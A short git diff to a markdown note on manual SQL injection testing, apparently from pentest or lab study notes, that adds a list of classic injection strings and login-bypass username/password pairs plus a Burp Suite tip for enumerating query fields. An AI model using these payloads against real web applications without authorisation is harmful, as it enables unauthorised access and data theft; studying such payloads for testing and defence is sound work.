@@ -81,7 +81,18 @@ Metadata is data about the data, such as the name of a database or table, the da
 # Manual Methods
 ## check vulnerability
 ```
-search=killer' or 1='1
+' or 1='1
+' or 1=1;--
+' or 1=1;#
+') or ('x'='x
+' or like '%';--
+' or 1=1 LIMIT 1;--
+
+USERNAME: ' or 1/*
+PASSWORD: */ =1 --
+
+USERNAME: admin' or 'a'='a
+PASSWORD '#
 ```
 ## enumerate fields of search query
 In burpsuite, go to repeater mode and keep on increasing the numbers till the fields of search query gets printed on the webpage
